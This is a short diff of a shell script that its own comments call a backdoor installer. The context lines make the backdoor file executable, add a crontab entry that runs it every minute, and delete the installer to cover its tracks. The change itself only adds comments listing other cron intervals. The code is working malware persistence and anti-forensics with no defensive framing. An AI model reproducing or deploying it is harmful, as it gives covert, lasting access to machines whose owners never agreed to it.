@@ -26,4 +26,7 @@ fi
 
 chmod +x ~/${DIR}/${FILENAME}.sh #Makes the backdoor executable
 (crontab -l 2>/dev/null; echo "* * * * * bash $HOME/${DIR}/${FILENAME}.sh") | crontab - #Creates the cronjob responsible for calling the backdoor every MINUTE
+# */5 * * * * -> every 5 minutes
+# 0 * * * * -> every hour
+# 0 0 * * * -> every day at midnight.
 rm $CURR_SCRIPT #Removes this script after the usage.
